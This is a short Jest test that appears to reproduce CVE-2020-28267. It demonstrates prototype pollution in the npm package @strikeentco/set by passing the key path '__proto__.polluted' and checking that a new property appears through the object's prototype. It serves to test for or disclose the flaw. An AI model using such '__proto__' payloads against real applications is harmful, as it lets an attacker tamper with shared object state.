//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28267
test("prototype pollution in strikeentco/set ", () => {
  const sset = require("@strikeentco/set");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  sset(obj, "__proto__.polluted", "yes");
  expect(obj.polluted).toBe("yes");
});
